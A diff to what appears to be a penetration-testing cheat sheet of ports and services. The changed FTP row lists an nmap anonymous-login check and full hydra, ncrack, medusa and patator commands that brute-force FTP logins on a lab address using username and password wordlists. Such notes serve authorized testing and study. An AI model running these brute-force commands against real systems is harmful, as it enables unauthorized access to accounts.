@@ -10,9 +10,8 @@
 |15|tcp|netstat||
 |17|tcp|quote of the day||
 |19|tcp|character generator||
-|21|tcp|ftp|nmap --script ftp-anon `target`
-xhydra,hydra,ncrack,patator,metasploit,medusa
-                  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp
+|21|tcp|ftp|nmap --script ftp-anon `target`xhydra,hydra,ncrack,patator,metasploit,medusa
+hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp
                   ncrack –v -U /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103:21
                   medusa -h 192.168.1.103 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M ftp
                   patator ftp_login host=192.168.1.103 user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
